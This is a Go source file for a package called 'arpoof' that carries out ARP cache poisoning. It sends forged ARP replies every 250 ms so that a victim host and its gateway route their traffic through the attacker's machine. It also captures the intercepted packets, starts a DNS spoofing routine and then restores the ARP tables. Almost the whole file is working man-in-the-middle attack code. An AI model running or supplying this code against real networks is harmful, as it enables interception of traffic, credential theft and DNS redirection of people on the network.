package arpoof

import (
	"log"
	"os"
	"os/signal"
	"time"

	hdisc "github.com/KennyZ69/HdiscLib"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Runs and utilizes both the arp and dns spoofing features
func Spoof(target, gateway hdisc.DevData) {
	log.Println("Starting spoofing function")
	stop := make(chan struct{}, 2) // len of 2 because I need to cancel the reading and writing

	ifi, err := hdisc.LocalIface()
	if err != nil {
		log.Fatalf("Error getting local net interface: %s\n", err)
	}

	handle, err := pcap.OpenLive(ifi.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Error opening pcap.Handle: %s\n", err)
	}
	defer handle.Close()

	ownIP, _, err := hdisc.GetLocalNet()
	if err != nil {
		log.Fatalf("Error getting local ipnet and ip: %s\n", err)
	}

	localDev := &hdisc.DevData{IP: ownIP, Mac: ifi.HardwareAddr}
	stats := &PacketStats{}

	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt)
	go func() {
		for range c {
			log.Println("Exiting spoofing gracefully ... ")
			// stats.printSummary() // uncomment to get the counters of intercepted packets
			close(stop)
		}
	}()

	go func() {
		time.Sleep(1 * time.Second)
		// stats.printSummary() // uncomment to get the counters of intercepted packets
	}()

	go readARP(handle, stop, stats)

	<-WriteARPPack(handle, *localDev, target, gateway, time.Millisecond*250, stop)

	go DNSpoof()

	<-RestoreARPTables(handle, gateway, target)

	return
}

func WriteARPPack(handle *pcap.Handle, attacker, target, gateway hdisc.DevData, timeout time.Duration, stop chan struct{}) chan struct{} {

	stopped := make(chan struct{})

	go func(stopped chan struct{}) {
		t := time.NewTicker(timeout)
		for {
			select {
			case <-stop:
				log.Println("ARP Spoofing stopped!")
				stopped <- struct{}{}
				return
			default:
				<-t.C

				p, err := NewARPRep(hdisc.DevData{IP: gateway.IP, Mac: attacker.Mac}, target)
				if err != nil {
					log.Printf("Error creating arp request: %s\n", err)
					continue
				}
				if err = handle.WritePacketData(p); err != nil {
					log.Printf("Error writing packet to handle: %s\n", err)
					continue
				}

				p, err = NewARPRep(hdisc.DevData{IP: target.IP, Mac: attacker.Mac}, gateway)
				if err != nil {
					log.Printf("Error creating arp reply: %s\n", err)
					continue
				}
				if err = handle.WritePacketData(p); err != nil {
					log.Printf("Error writing packet to handle: %s\n", err)
					continue
				}
				// log.Printf("Sending ARP packet: (%s:%s) -> (%s:%s)\n", attacker.IP.String(), attacker.Mac.String(), target.IP.String(), target.Mac.String()) // uncomment for debugging
			}
		}
	}(stopped)

	return stopped
}

func RestoreARPTables(handle *pcap.Handle, gateway, victim hdisc.DevData) chan struct{} {
	log.Println("Restoring ARP tables on the victim machine...")
	stopCh := make(chan struct{})

	go func() {
		t := time.NewTicker(time.Millisecond * 250)
		resDur := time.NewTimer(time.Second * 5)

		for {
			select {
			case <-resDur.C:
				t.Stop()
				close(stopCh)
				return
			case <-t.C:
				// Restore victim's view: "Gateway is at its real MAC"
				p, err := NewARPRep(gateway, victim)
				if err != nil {
					log.Printf("Error creating victim restoration packet: %v\n", err)
					continue
				}
				if err := handle.WritePacketData(p); err != nil {
					log.Printf("Error sending to victim: %v\n", err)
				}

				// Restore gateway's view: "Victim is at its real MAC"
				p, err = NewARPRep(victim, gateway)
				if err != nil {
					log.Printf("Error creating gateway restoration packet: %v\n", err)
					continue
				}
				if err := handle.WritePacketData(p); err != nil {
					log.Printf("Error sending to gateway: %v\n", err)
				}

				log.Println("Sent ARP restoration packets")
			}
		}
	}()

	return stopCh
}

func readARP(handle *pcap.Handle, stop chan struct{}, stats *PacketStats) {
	ps := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	packets := ps.Packets()
	for {
		select {
		case <-stop:
			return
		case p := <-packets:
			stats.addFromPacket(p)
		}
	}
}
